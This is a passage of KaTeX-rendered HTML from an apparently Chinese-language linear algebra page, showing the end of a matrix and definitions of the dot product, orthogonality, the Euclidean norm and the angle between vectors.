vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.4799999999999995em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.9799999999999995em;"><span style="top:-5.64em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-4.44em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-2.5799999999999996em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋱</span></span></span><span style="top:-1.3800000000000006em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.4799999999999995em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.9799999999999995em;"><span style="top:-5.8275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-4.6275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.7674999999999996em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-1.5675000000000006em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.4799999999999995em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.950035em;"><span style="top:-1.3499850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-2.4999950000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-3.0950050000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-3.6900150000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-3.7100150000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-4.950035000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.4500349999999997em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>
<h3 id="度量向量长度和向量夹角"><a class="anchor" href="#度量向量长度和向量夹角">#</a> 度量向量长度和向量夹角</h3>
<p><strong>点积 (dot product)</strong></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>设</mtext><mi>v</mi><mo separator="true">,</mo><mi>w</mi><mo>∈</mo><mi>V</mi><mo>⊂</mo><msup><mi>R</mi><mi>m</mi></msup><mspace width="1em"/><mtext>记</mtext><mi>v</mi><mo separator="true">,</mo><mi>w</mi><mtext>的坐标如下：</mtext><mi>v</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>x</mi><mi>m</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mspace width="1em"/><mi>w</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>y</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>y</mi><mi>m</mi></msub><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">设v,w \in V \subset R^m \quad 记v,w的坐标如下：v=(x_1,x_2,..x_m),\quad w=(y_1,y_2,...,y_m)
.
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">设</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9088319999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord cjk_fallback">记</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">坐</span><span class="mord cjk_fallback">标</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">：</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">.</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>记</mtext><mi>V</mi><mtext>与</mtext><mi>W</mi><mtext>的点积为</mtext><mo>:</mo><mspace width="1em"/><mi>v</mi><mo separator="true">⋅</mo><mi>w</mi><mo>=</mo><msub><mi>x</mi><mn>1</mn></msub><msub><mi>y</mi><mn>1</mn></msub><mo>+</mo><msub><mi>x</mi><mn>2</mn></msub><msub><mi>y</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>x</mi><mi>m</mi></msub><msub><mi>y</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">记 V与 W的点积为: \quad v·w=x_1y_1+x_2y_2+...+x_my_m
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">记</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord cjk_fallback">与</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">点</span><span class="mord cjk_fallback">积</span><span class="mord cjk_fallback">为</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>若</mtext><mi>v</mi><mo separator="true">⋅</mo><mi>w</mi><mo>=</mo><mn>0</mn><mtext>，我们称</mtext><mi>v</mi><mtext>与</mtext><mi>w</mi><mtext>正交</mtext><mo stretchy="false">(</mo><mi>o</mi><mi>r</mi><mi>t</mi><mi>h</mi><mi>o</mi><mi>g</mi><mi>o</mi><mi>n</mi><mi>a</mi><mi>l</mi><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">若 v·w=0，我们称 v与 w正交(orthogonal).
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">若</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">称</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord cjk_fallback">与</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord cjk_fallback">正</span><span class="mord cjk_fallback">交</span><span class="mopen">(</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span><span class="mord">.</span></span></span></span></span></p>
<p><strong>欧几里得范数 (Euclidean norm)</strong></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>向量</mtext><mi>v</mi><mtext>的长度，或称欧几里得范数，为</mtext><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>v</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mo>=</mo><msqrt><mrow><msubsup><mi>x</mi><mn>1</mn><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>x</mi><mn>2</mn><mn>2</mn></msubsup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msubsup><mi>x</mi><mi>m</mi><mn>2</mn></msubsup></mrow></msqrt><mo separator="true">,</mo><mspace width="1em"/><mi>v</mi><mo separator="true">⋅</mo><mi>v</mi><mo>=</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>v</mi><mi mathvariant="normal">∣</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">向量 v的长度，或称欧几里得范数，为 ||v||=\sqrt {x_1^2+x_2^2+...+x_m^2}, \quad v·v=||v||^2
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">长</span><span class="mord cjk_fallback">度</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">称</span><span class="mord cjk_fallback">欧</span><span class="mord cjk_fallback">几</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">范</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">为</span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord">∣</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.84em;vertical-align:-0.5413249999999998em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2986750000000002em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7959080000000001em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.0448000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7959080000000001em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.0448000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.258675em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width='400em' height='1.8800000000000001em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M983 90
l0 -0
c4,-6.7,10,-10,18,-10 H400000v40
H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7
s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744
c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30
c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722
c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5
c53.7,-170.3,84.5,-266.8,92.5,-289.5z
M1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5413249999999998em;"><span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord">∣</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></p>
<ol>
<li>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>记</mtext><mi>θ</mi><mtext>为向量</mtext><mi>v</mi><mo separator="true">,</mo><mi>w</mi><mtext>之间的角（这里我们把</mtext><mi>v</mi><mo separator="true">,</mo><mi>w</mi><mtext>的起始点都放在原点</mtext><mn>0</mn><mtext>）。则</mtext><mi>v</mi><mo separator="true">⋅</mo><mi>w</mi><mo>=</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>v</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mo separator="true">⋅</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>w</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>c</mi><mi>o</mi><mi>s</mi><mi>θ</mi></mrow><annotation encoding="application/x-tex">记 \theta为向量v,w 之间的角（这里我们把 v,w的起始点都放在原点0）。则 v·w=||v|| ·||w||cos \theta
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">记</span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">间</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">角</span><span class="mord cjk_fallback">（</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">把</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">起</span><span class="mord cjk_fallback">始</span><span class="mord cjk_fallback">点</span><span class="mord cjk_fallback">都</span><span class="mord cjk_fallback">放</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">原</span><span class="mord cjk_fallback">点</span><span class="mord">0</span><span class="mord cjk_fallback">）</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">则</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span 